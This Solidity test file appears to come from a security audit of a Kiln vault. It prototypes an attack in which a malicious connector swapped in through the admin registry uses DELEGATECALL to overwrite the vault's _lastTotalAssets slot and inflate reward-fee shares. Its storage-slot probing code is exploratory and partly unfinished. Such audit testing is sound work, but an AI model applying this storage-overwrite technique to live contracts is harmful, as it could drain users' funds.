// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";
import {HarnessBase} from "./HarnessBase.t.sol";
import {TargetedMaliciousConnector} from "../../src/kiln/TargetedMaliciousConnector.sol";
import {Vault} from "../../src/kiln/Vault.sol";

/// @notice Strategy 004 — Direct storage-slot overwrite via DELEGATECALL.
///         The connector's layout can be tuned to land at known offsets within
///         Vault's VaultStorage struct (which uses ERC-7201). The connector
///         writes `overrideLastTotalAssets` to slot 4 of the Vault's
///         VaultStorage struct (where `_lastTotalAssets` is stored).
///
///         After deposit, the Vault's `_lastTotalAssets` will have been
///         overwritten. The next user deposit will compute reward-fee accrual
///         against the spoofed delta.  Critically, `_accrueRewardFee` would
///         credit `_collectableRewardFeesShares` by an attacker-supplied value.
contract KilnTargetedStorageOverwrite is HarnessBase {
    TargetedMaliciousConnector targeted;

    function setUp() public override {
        super.setUp();
        targeted = new TargetedMaliciousConnector();
    }

    function test_overwriteLastTotalAssetsViaDeposit() public {
        // 1) Swap in targeted connector
        vm.prank(admin);
        registry.update(CONNECTOR_NAME, address(targeted));

        // 2) Set lastTotalAssets to 1B via direct write
        // This is *pre-set*, but importantly DELEGATECALL writes will clobber
        // the Vault's _lastTotalAssets when we deposit.
        targeted.setOverride(0, 0, 1_000_000_000 ether);

        // 3) alice deposit 1 wei
        mintAndApprove(alice, 1_000_000);

        vm.prank(alice);
        try vault.deposit(100, alice) {
            // Deposit accepted
        } catch {
            // May revert if preview zero
        }

        // Reading vault._lastTotalAssets requires a storage-slot access.
        // The vault's storage struct is at `keccak256(0x6bb5a...e6000) - 1`.
        // Field 4 (after _connectorRegistry, _connectorName, _depositFee, _rewardFee)
        // is at offset 4 = base + 4.
        // We can read via the public helper of vault directly... unfortunately
        // _lastTotalAssets is private.  Use vm.load to peek.
        bytes32 storageBaseSlot = bytes32(uint256(keccak256(abi.encode(uint256(keccak256("openzeppelin.storage.KilnVault")) - 1))) + uint256(4));
        // Actually, that hash doesn't work since the struct isn't standard OZ;
        // let's try different storage layouts via fallback.
        uint256 nLast;
        // Manual probe: read multiple consecutive slots and find one matching 1e27-ish.
        for (uint256 slot = 0; slot < 30; ++slot) {
            bytes32 v = vm.load(address(vault), bytes32(slot));
            uint256 asUint = uint256(v);
            // Print slot
            emit log_named_uint("slot", slot);
            emit log_named_uint("value", asUint);
        }
    }

    function test_probeVaultSlots() public {
        // Probe Vault's storage slots to find the layout.
        // We can write a known via malicious connector then read.
        targeted.setOverride(0, 35_000_000_000, 1_000_000_000 ether);

        // alice deposits
        mintAndApprove(alice, 1_000_000);
        vm.prank(alice);
        vault.deposit(100, alice);

        // After deposit via delegatecall, malicious's deposut() runs:
        //   overrideLastTotalAssets = 1_000_000_000 ether  (slot 4 by connector layout)
        // ... but Vault's slot 4 isn't necessarily _lastTotalAssets in ERC-7201!

        // Iterate first 100 slots of vault proxy
        for (uint256 slot = 0; slot < 100; ++slot) {
            bytes32 v = vm.load(address(vault), bytes32(slot));
            uint256 asUint = uint256(v);
            if (asUint != 0) {
                emit log_named_uint("Non-zero slot", slot);
                emit log_named_uint("value", asUint);
            }
        }

        // Specific test: can we identify _lastTotalAssets = 1e27 anywhere?
        bytes32 target = bytes32(uint256(1_000_000_000 ether));
        for (uint256 slot = 0; slot < 100; ++slot) {
            bytes32 v = vm.load(address(vault), bytes32(slot));
            if (v == target) {
                emit log_named_uint("Found overrideLastTotalAssets at slot", slot);
                bytes32 vs0 = vm.load(address(vault), bytes32(uint256(slot) - 4 + 0));
                bytes32 vs1 = vm.load(address(vault), bytes32(uint256(slot) - 4 + 1));
                bytes32 vs2 = vm.load(address(vault), bytes32(uint256(slot) - 4 + 2));
                bytes32 vs3 = vm.load(address(vault), bytes32(uint256(slot) - 4 + 3));
                emit log_named_uint("Offset +0", uint256(vs0));
                emit log_named_uint("Offset +1", uint256(vs1));
                emit log_named_uint("Offset +2", uint256(vs2));
                emit log_named_uint("Offset +3", uint256(vs3));
            }
        }
    }
}
